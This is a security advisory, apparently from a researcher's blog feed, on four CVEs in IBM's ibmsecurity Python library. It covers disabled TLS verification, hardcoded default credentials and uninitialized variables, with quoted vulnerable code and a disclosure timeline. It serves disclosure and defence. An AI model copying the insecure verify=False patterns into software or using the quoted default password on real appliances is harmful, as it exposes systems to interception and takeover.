<?xml version="1.0" encoding="utf-8"?>
<feed xmlns="http://www.w3.org/2005/Atom">
    <author>Pierre Kim &lt;pierre.kim.sec@gmail.com&gt;</author>
    <title>IT Security Research by Pierre</title>
    
    <entry>
        <title>4 vulnerabilities in ibmsecurity</title>
        <link href="2024-11-01-ibmsecurity-4-vulnerabilities.html"/>
        <content type="html"><h2>Product description</h2>
<blockquote>
<p>This repository contains Python code to manage IBM Security Appliances using their respective REST APIs. ISAM appliance has the most mature code.</p>
<p>From <a href="https://github.com/IBM-Security/ibmsecurity">https://github.com/IBM-Security/ibmsecurity</a></p>
</blockquote>
<h2>Vulnerability Summary</h2>
<p>Vulnerable versions: ibmsecurity &lt; v2024.4.5.</p>
<p>The summary of the vulnerabilities is as follows:</p>
<ol>
<li><a href="#insecure-communications-1">CVE-2024-31871 - Insecure communications 1/2</a></li>
<li><a href="#insecure-communications-2">CVE-2024-31872 - Insecure communications 2/2</a></li>
<li><a href="#hardcoded-passwords">CVE-2024-31873 - Hardcoded passwords</a></li>
<li><a href="#uninitialized-variables">CVE-2024-31874 - Uninitialized variables</a></li>
</ol>
<p>TL;DR: An attacker located on the network can MITM TLS connections to IBM Security Verify Access (ISVA) appliances, recover credentials and compromise the entire IBM Security Verify Access infrastructure. IBM Security Verify Access is a SSO solution mainly used by banks, Fortune 500 companies and governmental entities.</p>
<p><em>Miscellaneous notes</em>:</p>
<p>The vulnerabilities were found in February 2023 and were communicated to IBM in March 2023. They ultimately were patched in April 2024 (after 13 months).</p>
<p>Communication with IBM was difficult. At first, IBM support had confirmed that they would patch the vulnerabilities found in the ibmsecurity library. Then, in April 2024, IBM advised that the only way to get security patches is to go Full-disclosure and open a github issue containing all technical details. Although this was unusual, I created a github issue, which <a href="https://github.com/IBM-Security/ibmsecurity/issues/416">was subsequently redacted by IBM</a>.</p>
<p><em>Impacts</em></p>
<p>An attacker can compromise the entire authentication infrastructure based on IBM Security Verify Access by intercepting admin credentials on the network.</p>
<p><em>Recommendations</em></p>
<ul>
<li>Apply security patches.</li>
<li>Enable certificate validation (not enabled by default).</li>
</ul>
<p><a id="insecure-communications-1"></a></p>
<h2>Details - Insecure communications 1/2</h2>
<p>The ibmsecurity package has been partially audited as it provides the underlying Python APIs used to communicate with IBM Security Verify Access (ISVA).</p>
<p>Unfortunately, the security of the ibmsecurity package is very poor and, by default, all the SSL/TLS connections to the remote ISVA server are configured in an insecure way.</p>
<p>The latest version of the ibmsecurity library (<code>ibmsecurity-2022.8.22.0</code>) has been downloaded using pip in order for the source code to be reviewed:</p>
<pre><code>kali% pip download ibmsecurity
Collecting ibmsecurity
Using cached ibmsecurity-2022.8.22.0-py3-none-any.whl (391 kB)
Collecting requests
Using cached requests-2.28.1-py3-none-any.whl (62 kB)
Collecting charset-normalizer&lt;3,&gt;=2
Using cached charset_normalizer-2.1.1-py3-none-any.whl (39 kB)
Collecting urllib3&lt;1.27,&gt;=1.21.1
Using cached urllib3-1.26.12-py2.py3-none-any.whl (140 kB)
Collecting certifi&gt;=2017.4.17
Using cached certifi-2022.9.24-py3-none-any.whl (161 kB)
Collecting idna&lt;4,&gt;=2.5
Using cached idna-3.4-py3-none-any.whl (61 kB)
Saved ./ibmsecurity-2022.8.22.0-py3-none-any.whl
Saved ./requests-2.28.1-py3-none-any.whl
Saved ./certifi-2022.9.24-py3-none-any.whl
Saved ./charset_normalizer-2.1.1-py3-none-any.whl
Saved ./idna-3.4-py3-none-any.whl
Saved ./urllib3-1.26.12-py2.py3-none-any.whl
Successfully downloaded ibmsecurity requests certifi charset-normalizer idna urllib3
kali%
</code></pre>
<p>The <code>invoke_*</code> functions in the ibmsecurity library will use by default the <code>_suppress_ssl_warning()</code> method that will remove any security related to SSL/TLS.</p>
<p>For example, the method <code>invoke_put()</code> is defined in the file <code>ibmsecurity/appliance/isamappliance.py</code>, as shown below on line 402:</p>
<p>Content of <code>ibmsecurity/appliance/isamappliance.py</code>:</p>
<div class="colorful" style="background: #f8f8f8"><pre style="line-height: 125%"><span></span><span style="color: #666666">...</span>
  <span style="color: #666666">3</span> <span style="color: #008000; font-weight: bold">from</span> <span style="color: #0000FF; font-weight: bold">requests.packages.urllib3.exceptions</span> <span style="color: #008000; font-weight: bold">import</span> InsecureRequestWarning
<span style="color: #666666">...</span>
 <span style="color: #666666">17</span> <span style="color: #008000; font-weight: bold">class</span> <span style="color: #0000FF; font-weight: bold">ISAMAppliance</span>(IBMAppliance):
<span style="color: #666666">...</span>
 <span style="color: #666666">45</span>     <span style="color: #008000; font-weight: bold">def</span> <span style="color: #0000FF">_suppress_ssl_warning</span>(<span style="color: #008000">self</span>):
 <span style="color: #666666">46</span>         <span style="color: #408080; font-style: italic"># Disable https warning because of non-standard certs on appliance</span>
 <span style="color: #666666">47</span>         <span style="color: #008000; font-weight: bold">try</span>:
 <span style="color: #666666">48</span>             <span style="color: #008000">self</span><span style="color: #666666">.</span>logger<span style="color: #666666">.</span>debug(<span style="color: #BA2121">&quot;Suppressing SSL Warnings.&quot;</span>)
 <span style="color: #666666">49</span>             requests<span style="color: #666666">.</span>packages<span style="color: #666666">.</span>urllib3<span style="color: #666666">.</span>disable_warnings(InsecureRequestWarning) <span style="color: #408080; font-style: italic"># [1] &lt;- !!!!!!!!!!!!!!!!!!!!!!!!!!!!!!</span>
 <span style="color: #666666">50</span>         <span style="color: #008000; font-weight: bold">except</span> <span style="color: #D2413A; font-weight: bold">AttributeError</span>:
 <span style="color: #666666">51</span>             <span style="color: #008000">self</span><span style="color: #666666">.</span>logger<span style="color: #666666">.</span>warning(<span style="color: #BA2121">&quot;load requests.packages.urllib3.disable_warnings() failed&quot;</span>)
<span style="color: #666666">...</span>
<span style="color: #666666">402</span>     <span style="color: #008000; font-weight: bold">def</span> <span style="color: #0000FF">invoke_put</span>(<span style="color: #008000">self</span>, description, uri, data, ignore_error<span style="color: #666666">=</span><span style="color: #008000">False</span>, requires_modules<span style="color: #666666">=</span><span style="color: #008000">None</span>, requires_version<span style="color: #666666">=</span><span style="color: #008000">None</span>,
<span style="color: #666666">403</span>                    warnings<span style="color: #666666">=</span>[], requires_model<span style="color: #666666">=</span><span style="color: #008000">None</span>):
<span style="color: #666666">404</span>         <span style="color: #BA2121">&quot;&quot;&quot; </span>
<span style="color: #BA2121">405         Send a PUT request to the LMI.</span>
<span style="color: #BA2121">406         &quot;&quot;&quot;</span> 
<span style="color: #666666">407</span> 
<span style="color: #666666">408</span>         <span style="color: #008000">self</span><span style="color: #666666">.</span>_log_request(<span style="color: #BA2121">&quot;PUT&quot;</span>, uri, description)
<span style="color: #666666">409</span>         response <span style="color: #666666">=</span> <span style="color: #008000">self</span><span style="color: #666666">.</span>_invoke_request(<span style="color: #008000">self</span><span style="color: #666666">.</span>session<span style="color: #666666">.</span>put, description, uri,
<span style="color: #666666">410</span>                                         ignore_error, data,
<span style="color: #666666">411</span>                                         requires_modules<span style="color: #666666">=</span>requires_modules, requires_version<span style="color: #666666">=</span>requires_version,
<span style="color: #666666">412</span>                                         requires_model<span style="color: #666666">=</span>requires_model, warnings<span style="color: #666666">=</span>warnings)
<span style="color: #666666">413</span>         <span style="color: #008000; font-weight: bold">return</span> response
<span style="color: #666666">...</span>
</pre></div>

<p>The method <code>_invoke_request()</code> called on line 409 inside the <code>invoke_put()</code> method will disable any SSL/TLS security on line 334 by calling the method <code>_suppress_ssl_warning()</code> previously defined on line 45:</p>
<p>Content of <code>ibmsecurity/appliance/isamappliance.py</code>:</p>
<div class="colorful" style="background: #f8f8f8"><pre style="line-height: 125%"><span></span><span style="color: #666666">...</span>
<span style="color: #666666">305</span>     <span style="color: #008000; font-weight: bold">def</span> <span style="color: #0000FF">_invoke_request</span>(<span style="color: #008000">self</span>, func, description, uri, ignore_error, data<span style="color: #666666">=</span>{}, requires_modules<span style="color: #666666">=</span><span style="color: #008000">None</span>,
<span style="color: #666666">306</span>                         requires_version<span style="color: #666666">=</span><span style="color: #008000">None</span>, warnings<span style="color: #666666">=</span>[], requires_model<span style="color: #666666">=</span><span style="color: #008000">None</span>):
<span style="color: #666666">307</span>         <span style="color: #BA2121">&quot;&quot;&quot;</span>
<span style="color: #BA2121">308         Send a request to the LMI.  This function is private and should not be</span>
<span style="color: #BA2121">309         used directly.  The invoke_get/invoke_put/etc functions should be used instead.</span>
<span style="color: #BA2121">310         &quot;&quot;&quot;</span>
<span style="color: #666666">...</span>
<span style="color: #666666">334</span>         <span style="color: #008000">self</span><span style="color: #666666">.</span>_suppress_ssl_warning() <span style="color: #408080; font-style: italic"># &lt;- insecure SSL/TLS connection to the remote ISVA instance</span>
<span style="color: #666666">...</span>
<span style="color: #666666">336</span>         <span style="color: #008000; font-weight: bold">try</span>:
<span style="color: #666666">337</span>             <span style="color: #008000; font-weight: bold">if</span> func <span style="color: #666666">==</span> <span style="color: #008000">self</span><span style="color: #666666">.</span>session<span style="color: #666666">.</span>get <span style="color: #AA22FF; font-weight: bold">or</span> func <span style="color: #666666">==</span> <span style="color: #008000">self</span><span style="color: #666666">.</span>session<span style="color: #666666">.</span>delete:
<span style="color: #666666">338</span>             
<span style="color: #666666">339</span>                 <span style="color: #008000; font-weight: bold">if</span> data <span style="color: #666666">!=</span> {}:
<span style="color: #666666">340</span>                     r <span style="color: #666666">=</span> func(url<span style="color: #666666">=</span><span style="color: #008000">self</span><span style="color: #666666">.</span>_url(uri), data<span style="color: #666666">=</span>json_data, verify<span style="color: #666666">=</span><span style="color: #008000">False</span>, headers<span style="color: #666666">=</span>headers)
<span style="color: #666666">341</span>                 <span style="color: #008000; font-weight: bold">else</span>:
<span style="color: #666666">342</span>                     r <span style="color: #666666">=</span> func(url<span style="color: #666666">=</span><span style="color: #008000">self</span><span style="color: #666666">.</span>_url(uri), verify<span style="color: #666666">=</span><span style="color: #008000">False</span>, headers<span style="color: #666666">=</span>headers)
<span style="color: #666666">343</span>             <span style="color: #008000; font-weight: bold">else</span>:
<span style="color: #666666">344</span>                 r <span style="color: #666666">=</span> func(url<span style="color: #666666">=</span><span style="color: #008000">self</span><span style="color: #666666">.</span>_url(uri), data<span style="color: #666666">=</span>json_data,
<span style="color: #666666">345</span>                          verify<span style="color: #666666">=</span><span style="color: #008000">False</span>, headers<span style="color: #666666">=</span>headers)
<span style="color: #666666">346</span> 
<span style="color: #666666">347</span>             <span style="color: #008000; font-weight: bold">if</span> func <span style="color: #666666">!=</span> <span style="color: #008000">self</span><span style="color: #666666">.</span>session<span style="color: #666666">.</span>get:
<span style="color: #666666">348</span>                 return_obj[<span style="color: #BA2121">&#39;changed&#39;</span>] <span style="color: #666666">=</span> <span style="color: #008000">True</span>  <span style="color: #408080; font-style: italic"># Anything but GET should result in change</span>
<span style="color: #666666">349</span> 
<span style="color: #666666">350</span>             <span style="color: #008000">self</span><span style="color: #666666">.</span>_process_response(return_obj<span style="color: #666666">=</span>return_obj, http_response<span style="color: #666666">=</span>r, ignore_error<span style="color: #666666">=</span>ignore_error)
<span style="color: #666666">...</span>
</pre></div>

<p>Execution flow: The <code>invoke_put()</code> method is defined on the line 402 of the <code>ibmsecurity/appliance/isamappliance.py</code> file. This method will then use the <code>_invoke_request()</code> method, defined on line 305. This <code>_invoke_request()</code> method will call the <code>suppress_ssl_warning()</code> method on line 334. The <code>suppress_ssl_warning()</code> method is defined on line 45: any security related to SSL/TLS will be then removed.</p>
<p>These methods defined in <code>ibmsecurity/appliance/isamappliance.py</code> are insecure:</p>
<ul>
<li>invoke_post_files (line 148)</li>
<li>invoke_put_files (line 203)</li>
<li>invoke_get_file (line 246)</li>
<li>_invoke_request (line 305)</li>
<li>_invoke_request_with_headers (line 355)</li>
<li>invoke_post_snapshot_id (line 427)</li>
<li>invoke_request (line 516)</li>
</ul>
<p>These methods defined in <code>ibmsecurity/appliance/isdsappliance.py</code> are also insecure:</p>
<ul>
<li>invoke_post_files (line 135)</li>
<li>invoke_put_files (line 184)</li>
<li>invoke_get_file (line 228)</li>
<li>_invoke_request (line 288)</li>
</ul>
<p>In the <code>ibmsecurity/appliance/isdsappliance.py</code> Python file, we can find again the same <code>suppress_ssl_warning()</code> method which is also used by other methods (e.g. <code>invoke_post_files()</code> as shown below):</p>
<div class="colorful" style="background: #f8f8f8"><pre style="line-height: 125%"><span></span>  <span style="color: #666666">3</span> <span style="color: #008000; font-weight: bold">from</span> <span style="color: #0000FF; font-weight: bold">requests.packages.urllib3.exceptions</span> <span style="color: #008000; font-weight: bold">import</span> InsecureRequestWarning
<span style="color: #666666">...</span>
 <span style="color: #666666">17</span> <span style="color: #008000; font-weight: bold">class</span> <span style="color: #0000FF; font-weight: bold">ISDSAppliance</span>(IBMAppliance):
<span style="color: #666666">...</span>
 <span style="color: #666666">39</span>     <span style="color: #008000; font-weight: bold">def</span> <span style="color: #0000FF">_suppress_ssl_warning</span>(<span style="color: #008000">self</span>):
 <span style="color: #666666">40</span>         <span style="color: #408080; font-style: italic"># Disable https warning because of non-standard certs on appliance</span>
 <span style="color: #666666">41</span>         <span style="color: #008000; font-weight: bold">try</span>:
 <span style="color: #666666">42</span>             <span style="color: #008000">self</span><span style="color: #666666">.</span>logger<span style="color: #666666">.</span>debug(<span style="color: #BA2121">&quot;Suppressing SSL Warnings.&quot;</span>)
 <span style="color: #666666">43</span>             requests<span style="color: #666666">.</span>packages<span style="color: #666666">.</span>urllib3<span style="color: #666666">.</span>disable_warnings(InsecureRequestWarning)
 <span style="color: #666666">44</span>         <span style="color: #008000; font-weight: bold">except</span> <span style="color: #D2413A; font-weight: bold">AttributeError</span>:
 <span style="color: #666666">45</span>             <span style="color: #008000">self</span><span style="color: #666666">.</span>logger<span style="color: #666666">.</span>warning(<span style="color: #BA2121">&quot;load requests.packages.urllib3.disable_warnings() failed&quot;</span>)
<span style="color: #666666">...</span>
<span style="color: #666666">135</span>     <span style="color: #008000; font-weight: bold">def</span> <span style="color: #0000FF">invoke_post_files</span>(<span style="color: #008000">self</span>, description, uri, fileinfo, data, ignore_error<span style="color: #666666">=</span><span style="color: #008000">False</span>, requires_modules<span style="color: #666666">=</span><span style="color: #008000">None</span>,
<span style="color: #666666">136</span>                           requires_version<span style="color: #666666">=</span><span style="color: #008000">None</span>, warnings<span style="color: #666666">=</span>[], json_response<span style="color: #666666">=</span><span style="color: #008000">True</span>):
<span style="color: #666666">...</span>
<span style="color: #666666">166</span>         <span style="color: #008000">self</span><span style="color: #666666">.</span>_suppress_ssl_warning()
<span style="color: #666666">167</span> 
<span style="color: #666666">168</span>         <span style="color: #008000; font-weight: bold">try</span>:
<span style="color: #666666">169</span>             r <span style="color: #666666">=</span> requests<span style="color: #666666">.</span>post(url<span style="color: #666666">=</span><span style="color: #008000">self</span><span style="color: #666666">.</span>_url(uri<span style="color: #666666">=</span>uri), data<span style="color: #666666">=</span>data, auth<span style="color: #666666">=</span>(<span style="color: #008000">self</span><span style="color: #666666">.</span>user<span style="color: #666666">.</span>username, <span style="color: #008000">self</span><span style="color: #666666">.</span>user<span style="color: #666666">.</span>password),
<span style="color: #666666">170</span>                               files<span style="color: #666666">=</span>files, verify<span style="color: #666666">=</span><span style="color: #008000">False</span>, headers<span style="color: #666666">=</span>headers)
<span style="color: #666666">171</span>             return_obj[<span style="color: #BA2121">&#39;changed&#39;</span>] <span style="color: #666666">=</span> <span style="color: #008000">True</span>  <span style="color: #408080; font-style: italic"># POST of file would be a change</span>
<span style="color: #666666">172</span>             <span style="color: #008000">self</span><span style="color: #666666">.</span>_process_response(return_obj<span style="color: #666666">=</span>return_obj, http_response<span style="color: #666666">=</span>r, ignore_error<span style="color: #666666">=</span>ignore_error)
<span style="color: #666666">...</span>
</pre></div>

<p>These methods are used everywhere in the ibmsecurity library to communicate with the remote ISVA infrastructure. 1162 calls to insecure methods have been identified:</p>
<pre><code>kali% rgrep invoke_ ibmsecurity
ibmsecurity/isds/server.py: return isdsAppliance.invoke_get("Retrieving Server Status", "/widgets/server")
ibmsecurity/isds/server.py: return isdsAppliance.invoke_post("Restarting the service " + serverID,
ibmsecurity/isds/server.py: return isdsAppliance.invoke_post("Restarting the service " + serverID,
ibmsecurity/isds/server.py: return isdsAppliance.invoke_post("Restarting the service " + serverID,
ibmsecurity/isds/server.py: return isdsAppliance.invoke_post("Restarting the service " + serverID,
ibmsecurity/isds/available_updates.py: return isdsAppliance.invoke_get("Retrieving available updates",
ibmsecurity/isds/available_updates.py: return isdsAppliance.invoke_get("Discover available updates",
ibmsecurity/isds/available_updates.py: return isdsAppliance.invoke_post_files(
ibmsecurity/isds/available_updates.py: ret_obj = isdsAppliance.invoke_post("Install Available Update",
ibmsecurity/isds/fixpack.py: return isdsAppliance.invoke_get("Retrieving fixpacks",
ibmsecurity/isds/fixpack.py: return isdsAppliance.invoke_post_files(
[...]
kali% rgrep invoke_ ibmsecurity | wc -l
1162
kali%
</code></pre>
<p>The ibmsecurity Python library massively uses insecure methods to communicate with the remote ISVA infrastructure, with 1162 calls to insecure functions.</p>
<p><a id="insecure-communications-2"></a></p>
<h2>Details - Insecure communications 2/2</h2>
<p>The ibmsecurity package has been partially audited as it provides the underlying Python APIs used to communicate with IBM Security Verify Access (ISVA).</p>
<p>Unfortunately, the security of the ibmsecurity package is very poor, and, by default, all the SSL/TLS connections to the remote ISVA server are insecure due to the insecure option (<code>Verify=false</code>) used with the methods provided by the <code>requests</code> module (to send HTTPS requests to the remote ISVA infrastructure).</p>
<p>For example, the method <code>invoke_post_snapshot_id()</code> will use <code>Verify=false</code> in the HTTPS request on line 455 to disable any verification of the remote SSL certificate (in addition to the previous insecure <code>_suppress_ssl_warning()</code> method found in <a href="#insecure-communications-1">Insecure communications 1/2</a>).</p>
<p>Content of <code>ibmsecurity/appliance/isamappliance.py</code>:</p>
<div class="colorful" style="background: #f8f8f8"><pre style="line-height: 125%"><span></span><span style="color: #666666">429</span>     <span style="color: #008000; font-weight: bold">def</span> <span style="color: #0000FF">invoke_post_snapshot_id</span>(<span style="color: #008000">self</span>, description, uri, data, ignore_error<span style="color: #666666">=</span><span style="color: #008000">False</span>, requires_modules<span style="color: #666666">=</span><span style="color: #008000">None</span>,
<span style="color: #666666">430</span>                                 requires_version<span style="color: #666666">=</span><span style="color: #008000">None</span>, warnings<span style="color: #666666">=</span>[], requires_model<span style="color: #666666">=</span><span style="color: #008000">None</span>):
<span style="color: #666666">431</span>         <span style="color: #BA2121">&quot;&quot;&quot; </span>
<span style="color: #BA2121">432         Send a POST request to the LMI.  Snapshot id is part of the uri.</span>
<span style="color: #BA2121">433         Requires different headers to normal post.</span>
<span style="color: #BA2121">434         &quot;&quot;&quot;</span> 
<span style="color: #666666">...</span>
<span style="color: #666666">452</span>         <span style="color: #008000">self</span><span style="color: #666666">.</span>_suppress_ssl_warning()
<span style="color: #666666">453</span>
<span style="color: #666666">454</span>         <span style="color: #008000; font-weight: bold">try</span>:                                                       <span style="color: #408080; font-style: italic"># VVVVVVVVVVVV</span>
<span style="color: #666666">455</span>             r <span style="color: #666666">=</span> <span style="color: #008000">self</span><span style="color: #666666">.</span>session<span style="color: #666666">.</span>post(url<span style="color: #666666">=</span><span style="color: #008000">self</span><span style="color: #666666">.</span>_url(uri<span style="color: #666666">=</span>uri), data<span style="color: #666666">=</span>data, verify<span style="color: #666666">=</span><span style="color: #008000">False</span>, headers<span style="color: #666666">=</span>headers)
<span style="color: #666666">456</span>             return_obj[<span style="color: #BA2121">&#39;changed&#39;</span>] <span style="color: #666666">=</span> <span style="color: #008000">False</span>  <span style="color: #408080; font-style: italic"># POST of snapshot id would not be a change</span>
<span style="color: #666666">457</span>             <span style="color: #008000">self</span><span style="color: #666666">.</span>_process_response(return_obj<span style="color: #666666">=</span>return_obj, http_response<span style="color: #666666">=</span>r, ignore_error<span style="color: #666666">=</span>ignore_error)
<span style="color: #666666">...</span>
</pre></div>

<p>Similar vulnerabilities can be found everywhere in the Python sources.</p>
<p>For example, in the method <code>invoke_request()</code> inside <code>ibmsecurity/appliance/isamappliance.py</code> and <code>invoke_get_file()</code> inside <code>ibmsecurity/appliance/isdsappliance.py</code>:</p>
<p>Content of <code>ibmsecurity/appliance/isamappliance.py</code> (line 555):</p>
<div class="colorful" style="background: #f8f8f8"><pre style="line-height: 125%"><span></span><span style="color: #666666">...</span>
<span style="color: #666666">518</span>     <span style="color: #008000; font-weight: bold">def</span> <span style="color: #0000FF">invoke_request</span>(<span style="color: #008000">self</span>, description, method, uri, filename<span style="color: #666666">=</span><span style="color: #008000">None</span>, ignore_error<span style="color: #666666">=</span><span style="color: #008000">False</span>, requires_modules<span style="color: #666666">=</span><span style="color: #008000">None</span>,
<span style="color: #666666">519</span>                        requires_version<span style="color: #666666">=</span><span style="color: #008000">None</span>,
<span style="color: #666666">520</span>                        warnings<span style="color: #666666">=</span>[], requires_model<span style="color: #666666">=</span><span style="color: #008000">None</span>, <span style="color: #666666">**</span>kwargs):
<span style="color: #666666">...</span>
<span style="color: #666666">551</span>         <span style="color: #008000">self</span><span style="color: #666666">.</span>_suppress_ssl_warning()
<span style="color: #666666">...</span>
<span style="color: #666666">555</span>             r <span style="color: #666666">=</span> <span style="color: #008000">self</span><span style="color: #666666">.</span>session<span style="color: #666666">.</span>request(method, url<span style="color: #666666">=</span><span style="color: #008000">self</span><span style="color: #666666">.</span>_url(uri), verify<span style="color: #666666">=</span><span style="color: #008000">False</span>, <span style="color: #666666">**</span>args)
</pre></div>

<p>Content of <code>ibmsecurity/appliance/isdsappliance.py</code> (line 254):</p>
<div class="colorful" style="background: #f8f8f8"><pre style="line-height: 125%"><span></span><span style="color: #666666">...</span>
<span style="color: #666666">228</span>     <span style="color: #008000; font-weight: bold">def</span> <span style="color: #0000FF">invoke_get_file</span>(<span style="color: #008000">self</span>, description, uri, filename, no_headers<span style="color: #666666">=</span><span style="color: #008000">False</span>, ignore_error<span style="color: #666666">=</span><span style="color: #008000">False</span>, requires_modules<span style="color: #666666">=</span><span style="color: #008000">None</span>,
<span style="color: #666666">229</span>                         requires_version<span style="color: #666666">=</span><span style="color: #008000">None</span>, warnings<span style="color: #666666">=</span>[]):
<span style="color: #666666">230</span>         <span style="color: #BA2121">&quot;&quot;&quot; </span>
<span style="color: #BA2121">231         Invoke a GET request and download the response data to a file</span>
<span style="color: #BA2121">232         &quot;&quot;&quot;</span> 
<span style="color: #666666">...</span>
<span style="color: #666666">251</span>         <span style="color: #008000">self</span><span style="color: #666666">.</span>_suppress_ssl_warning()
<span style="color: #666666">252</span> 
<span style="color: #666666">253</span>         <span style="color: #008000; font-weight: bold">try</span>:
<span style="color: #666666">254</span>             r <span style="color: #666666">=</span> requests<span style="color: #666666">.</span>get(url<span style="color: #666666">=</span><span style="color: #008000">self</span><span style="color: #666666">.</span>_url(uri<span style="color: #666666">=</span>uri), auth<span style="color: #666666">=</span>(<span style="color: #008000">self</span><span style="color: #666666">.</span>user<span style="color: #666666">.</span>username, <span style="color: #008000">self</span><span style="color: #666666">.</span>user<span style="color: #666666">.</span>password), verify<span style="color: #666666">=</span><span style="color: #008000">False</span>,
<span style="color: #666666">255</span>                              stream<span style="color: #666666">=</span><span style="color: #008000">True</span>, headers<span style="color: #666666">=</span>headers)
</pre></div>

<p>Vulnerable functions identified in <code>ibmsecurity/appliance/isdsappliance.py</code>:</p>
<ul>
<li>invoke_post_files vulnerability present on line 170;</li>
<li>invoke_put_files vulnerability present on line 214;</li>
<li>invoke_get_file vulnerability present on line 254;</li>
<li>_invoke_request vulnerabilities present on lines 322, 325 and 329;</li>
</ul>
<p>Vulnerable functions identified in <code>ibmsecurity/appliance/isamappliance.py</code>:</p>
<ul>
<li>invoke_post_files vulnerabilities present on lines 187 and 189;</li>
<li>invoke_put_files vulnerability present on line 232;</li>
<li>invoke_get_file vulnerability present on line 272;</li>
<li>_invoke_request vulnerabilities present on lines 338, 340 and 343;</li>
<li>_invoke_request_with_headers vulnerabilities present on lines 383, 385 and 388;</li>
<li>invoke_post_snapshot_id vulnerability present on line 453;</li>
<li>invoke_request vulnerability present on line 553.</li>
</ul>
<p>The vulnerable library can also be found in Github (<a href="https://github.com/IBM-Security/ibmsecurity/blob/master/ibmsecurity/appliance/isamappliance.py#L187">https://github.com/IBM-Security/ibmsecurity/blob/master/ibmsecurity/appliance/isamappliance.py#L187</a>):</p>
<div class="colorful" style="background: #f8f8f8"><pre style="line-height: 125%"><span></span>        <span style="color: #008000; font-weight: bold">try</span>:
            <span style="color: #008000; font-weight: bold">if</span> data_as_files <span style="color: #AA22FF; font-weight: bold">is</span> <span style="color: #008000">False</span>:
                r <span style="color: #666666">=</span> <span style="color: #008000">self</span><span style="color: #666666">.</span>session<span style="color: #666666">.</span>post(url<span style="color: #666666">=</span><span style="color: #008000">self</span><span style="color: #666666">.</span>_url(uri<span style="color: #666666">=</span>uri), data<span style="color: #666666">=</span>data, files<span style="color: #666666">=</span>files, verify<span style="color: #666666">=</span><span style="color: #008000">False</span>, headers<span style="color: #666666">=</span>headers)
            <span style="color: #008000; font-weight: bold">else</span>:
                r <span style="color: #666666">=</span> <span style="color: #008000">self</span><span style="color: #666666">.</span>session<span style="color: #666666">.</span>post(url<span style="color: #666666">=</span><span style="color: #008000">self</span><span style="color: #666666">.</span>_url(uri<span style="color: #666666">=</span>uri), files<span style="color: #666666">=</span>files, verify<span style="color: #666666">=</span><span style="color: #008000">False</span>, headers<span style="color: #666666">=</span>headers)
</pre></div>

<p>The ibmsecurity Python library massively uses insecure methods to communicate with the remote ISVA infrastructure, with 1162 calls to insecure functions.</p>
<p><a id="hardcoded-passwords"></a></p>
<h2>Details - Hardcoded passwords</h2>
<p>It was observed that the ibmsecurity library contains hardcoded users and passwords:</p>
<p>Content of <code>ibmsecurity/isam/web/reverse_proxy/federation_configuration.py</code>:</p>
<div class="colorful" style="background: #f8f8f8"><pre style="line-height: 125%"><span></span><span style="color: #666666">...</span>
<span style="color: #666666">7</span> <span style="color: #008000; font-weight: bold">def</span> <span style="color: #0000FF">config</span>(isamAppliance, instance_id, federation_id<span style="color: #666666">=</span><span style="color: #008000">None</span>, federation_name<span style="color: #666666">=</span><span style="color: #008000">None</span>, hostname<span style="color: #666666">=</span><span style="color: #BA2121">&#39;127.0.0.1&#39;</span>,
  port<span style="color: #666666">=</span><span style="color: #BA2121">&#39;443&#39;</span>, username<span style="color: #666666">=</span><span style="color: #BA2121">&#39;easuser&#39;</span>,
<span style="color: #666666">8</span> password<span style="color: #666666">=</span><span style="color: #BA2121">&#39;passw0rd&#39;</span>, reuse_certs<span style="color: #666666">=</span><span style="color: #008000">False</span>, reuse_acls<span style="color: #666666">=</span><span style="color: #008000">False</span>, check_mode<span style="color: #666666">=</span><span style="color: #008000">False</span>, force<span style="color: #666666">=</span><span style="color: #008000">False</span>):
<span style="color: #666666">...</span>
</pre></div>

<p>Similar vulnerabilities can be found in the source codes.</p>
<p>For example, in the method <code>invoke_request()</code> inside <code>ibmsecurity/appliance/isamappliance.py</code> and <code>invoke_get_file()</code> inside <code>ibmsecurity/appliance/isdsappliance.py</code>, we can find hardcoded credentials:</p>
<p>Content of <code>ibmsecurity/isam/web/reverse_proxy/oauth_configuration.py</code>:</p>
<div class="colorful" style="background: #f8f8f8"><pre style="line-height: 125%"><span></span><span style="color: #666666">...</span>
<span style="color: #666666">10</span> <span style="color: #008000; font-weight: bold">def</span> <span style="color: #0000FF">config</span>(isamAppliance, instance_id, hostname<span style="color: #666666">=</span><span style="color: #BA2121">&#39;127.0.0.1&#39;</span>, port<span style="color: #666666">=443</span>, username<span style="color: #666666">=</span><span style="color: #BA2121">&#39;easuser&#39;</span>, password<span style="color: #666666">=</span><span style="color: #BA2121">&#39;passw0rd&#39;</span>,
<span style="color: #666666">11</span> junction<span style="color: #666666">=</span><span style="color: #BA2121">&quot;/mga&quot;</span>, reuse_certs<span style="color: #666666">=</span><span style="color: #008000">False</span>, reuse_acls<span style="color: #666666">=</span><span style="color: #008000">False</span>, api<span style="color: #666666">=</span><span style="color: #008000">False</span>, browser<span style="color: #666666">=</span><span style="color: #008000">False</span>, auth_register<span style="color: #666666">=</span><span style="color: #008000">None</span>, fapi_compliant<span style="color: #666666">=</span><span style="color: #008000">None</span>,
<span style="color: #666666">12</span> check_mode<span style="color: #666666">=</span><span style="color: #008000">False</span>, force<span style="color: #666666">=</span><span style="color: #008000">False</span>):
<span style="color: #666666">...</span>
</pre></div>

<p>Content of <code>ibmsecurity/isam/web/reverse_proxy/aac_configuration.py</code>:</p>
<div class="colorful" style="background: #f8f8f8"><pre style="line-height: 125%"><span></span><span style="color: #666666">...</span>
<span style="color: #666666">9</span> <span style="color: #008000; font-weight: bold">def</span> <span style="color: #0000FF">config</span>(isamAppliance, instance_id, hostname<span style="color: #666666">=</span><span style="color: #BA2121">&#39;127.0.0.1&#39;</span>, port<span style="color: #666666">=443</span>, username<span style="color: #666666">=</span><span style="color: #BA2121">&#39;easuser&#39;</span>, password<span style="color: #666666">=</span><span style="color: #BA2121">&#39;passw0rd&#39;</span>,
<span style="color: #666666">10</span> junction<span style="color: #666666">=</span><span style="color: #BA2121">&quot;/mga&quot;</span>, reuse_certs<span style="color: #666666">=</span><span style="color: #008000">False</span>, reuse_acls<span style="color: #666666">=</span><span style="color: #008000">False</span>, check_mode<span style="color: #666666">=</span><span style="color: #008000">False</span>, force<span style="color: #666666">=</span><span style="color: #008000">False</span>):
<span style="color: #666666">...</span>
</pre></div>

<p>Attacker can use hardcoded passwords to compromise installations.</p>
<p><a id="uninitialized-variables"></a></p>
<h2>Details - Uninitialized variables</h2>
<p>It was observed that the ibmsecurity library uses variables before they are initialized in:</p>
<ul>
<li>ibmsecurity/isam/aac/attribute_matchers.py</li>
<li>ibmsecurity/isam/aac/risk_profiles.py</li>
</ul>
